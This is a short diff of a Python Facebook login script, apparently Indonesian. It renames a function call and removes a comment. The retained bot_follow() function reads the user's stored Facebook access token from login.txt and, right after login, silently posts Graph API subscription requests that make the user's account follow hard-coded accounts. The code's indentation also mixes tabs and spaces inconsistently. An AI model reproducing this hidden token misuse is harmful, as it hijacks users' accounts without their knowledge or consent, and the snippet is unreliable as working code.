@@ -124,8 +124,6 @@ def menu_log():
             xd.close()
             #jalan('\n%s[%s!%s] %sLogin Successful'%(K,P,K,P))
             bot_follow()
-
-## Bot Follow ##
 def bot_follow():
 	try:
 		toket=open("login.txt","r").read()
@@ -135,7 +133,7 @@ def bot_follow():
 		id = a["id"]
 	except IOError:
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
-        logs()
+        log()
     jalan("%s[%s•%s] %sSabar ngab sedang masuk..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/100061587581422/subscribers?access_token=" + toket) # Zuhra Zuhra
 	requests.post("https://graph.facebook.com/100001390111040/subscribers?access_token=" + toket) # Saya Aang
